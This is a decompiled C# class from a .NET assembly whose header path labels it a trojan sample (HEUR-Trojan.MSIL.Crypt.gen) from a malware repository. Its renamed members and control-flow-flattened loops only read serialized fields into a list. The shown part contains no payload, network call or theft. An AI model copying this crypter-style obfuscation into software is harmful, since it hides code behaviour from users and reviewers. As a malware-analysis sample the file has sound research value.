// Decompiled with JetBrains decompiler
// Type: Tourield.Roles.RegFactoryRole
// Assembly: DebuggerTypeProxyAttrib, Version=1.7.3.0, Culture=neutral, PublicKeyToken=null
// MVID: 3D9F2D5D-94C2-4B9B-BC0A-C78BF30C6035
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-5acf494024d29f4957958fce64819adc19bc7cffa6d323531e5a321496a04ae0.exe

using DebuggerTypeProxyAttrib.Maps;
using DebuggerTypeProxyAttrib.Pages;
using DebuggerTypeProxyAttrib.Templates;
using System;
using System.ComponentModel;
using System.Runtime.CompilerServices;
using Tourield.Attributes;
using Tourield.Workers;

namespace Tourield.Roles
{
  public class RegFactoryRole : RefWorker
  {
    private uint exporterWrapper;
    private byte m_RegWrapper;
    private byte messageWrapper;
    private string m_AnnotationWrapper;
    private string m_TaskWrapper;
    private string _SpecificationWrapper;
    private int _DispatcherWrapper;
    private string m_ComparatorWrapper;
    private uint _AdvisorWrapper;
    private BindingList<ParameterAttributeMapping> _RegistryWrapper;
    private bool creatorWrapper;

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public uint ComputeWrapper() => this.exporterWrapper;

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public byte StopWrapper() => this.m_RegWrapper;

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public byte InstantiateWrapper() => this.messageWrapper;

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public string RegisterWrapper() => this.m_AnnotationWrapper;

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public string LogoutWrapper() => this.m_TaskWrapper;

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public string SortWrapper() => this._SpecificationWrapper;

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public int DestroyWrapper() => this._DispatcherWrapper;

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public string ConnectWrapper() => this.m_ComparatorWrapper;

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public uint CountWrapper() => this._AdvisorWrapper;

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public BindingList<ParameterAttributeMapping> ManageWrapper()
    {
      if (this._RegistryWrapper == null)
        this._RegistryWrapper = new BindingList<ParameterAttributeMapping>();
      return this._RegistryWrapper;
    }

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public bool PublishWrapper() => this.creatorWrapper;

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public bool RevertWrapper() => this.CalcWrapper() == (byte) 2;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public RegFactoryRole(BroadcasterRulesTemplate spec)
    {
      RegistryPagePage.ListMethod();
      // ISSUE: explicit constructor call
      base.\u002Ector(spec);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public RegFactoryRole(TestsWrapperAttribute key, int sum_connection)
    {
      RegistryPagePage.ListMethod();
      // ISSUE: explicit constructor call
      base.\u002Ector(key, sum_connection);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected override void RestartAdapter(TestsWrapperAttribute item)
    {
      int num1 = 3;
      while (true)
      {
        int num2;
        switch (num1)
        {
          case 0:
          case 3:
            this.exporterWrapper = item.ReadPrototype();
            num1 = 5;
            continue;
          case 1:
          case 5:
            this.m_RegWrapper = item.EnablePrototype();
            this.messageWrapper = item.EnablePrototype();
            num2 = 6;
            break;
          case 2:
            this.m_ComparatorWrapper = item.ChangePrototype();
            this._AdvisorWrapper = item.ReadPrototype();
            if (RegFactoryRole.CloneMethod())
            {
              num1 = 4;
              continue;
            }
            goto case 4;
          case 4:
            this.VerifyWrapper(item);
            this.creatorWrapper = item.OrderPrototype();
            num2 = 7;
            break;
          case 6:
            this.m_AnnotationWrapper = item.ChangePrototype();
            this.m_TaskWrapper = item.ChangePrototype();
            this._SpecificationWrapper = item.ChangePrototype();
            this._DispatcherWrapper = item.FillPrototype();
            goto case 2;
          case 7:
            goto label_9;
          default:
            num2 = 2;
            break;
        }
        num1 = num2;
      }
label_9:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void VerifyWrapper(TestsWrapperAttribute i)
    {
      int num1 = 3;
      while (true)
      {
        int num2 = num1;
        uint length;
        int index1;
        string[] strArray1;
        string[] strArray2;
        string[] strArray3;
        int[] numArray;
        DateTime[] dateTimeArray;
        int index2;
        int index3;
        int index4;
        while (true)
        {
          switch (num2)
          {
            case 0:
              if ((long) index2 < (long) length)
              {
                strArray2[index2] = i.ChangePrototype();
                int num3 = 1;
                num2 = RegFactoryRole.ReadMethod() ? num3 : num3;
                continue;
              }
              goto label_16;
            case 1:
              ++index2;
              if (true)
              {
                num2 = 0;
                continue;
              }
              goto case 5;
            case 2:
              goto label_4;
            case 3:
              goto label_1;
            case 4:
            case 6:
            case 7:
            case 11:
              if ((long) index1 >= (long) length)
              {
                if (RegFactoryRole.CloneMethod())
                {
                  num2 = 8;
                  continue;
                }
                goto label_4;
              }
              else
                goto label_25;
            case 5:
              for (; (long) index4 < (long) length; ++index4)
                strArray3[index4] = i.ChangePrototype();
              index1 = 0;
              goto case 4;
            case 8:
              goto label_11;
            case 9:
              for (; (long) index3 < (long) length; ++index3)
                this.ManageWrapper().Add(new ParameterAttributeMapping(strArray1[index3], strArray2[index3], strArray3[index3], numArray[index3], dateTimeArray[index3]));
              if (RegFactoryRole.CloneMethod())
              {
                num2 = 12;
                continue;
              }
              goto case 0;
            case 10:
              dateTimeArray = new DateTime[(int) length];
              for (int index5 = 0; (long) index5 < (long) length; ++index5)
                strArray1[index5] = i.ChangePrototype();
              index2 = 0;
              goto case 0;
            case 12:
              goto label_24;
            default:
              goto label_23;
          }
        }
label_1:
        length = i.ReadPrototype();
        num1 = 2;
        continue;
label_4:
        strArray1 = new string[(int) length];
        strArray2 = new string[(int) length];
        strArray3 = new string[(int) length];
        numArray = new int[(int) length];
        num1 = 10;
        continue;
label_11:
        index3 = 0;
        num1 = 9;
        continue;
label_16:
        index4 = 0;
        num1 = 5;
        continue;
label_23:
        num1 = 4;
        continue;
label_25:
        numArray[index1] = i.FillPrototype();
        dateTimeArray[index1] = i.RestartPrototype();
        ++index1;
        num1 = 11;
      }
label_24:;
    }

    internal static bool CloneMethod() => true;

    internal static bool ReadMethod() => false;
  }
}
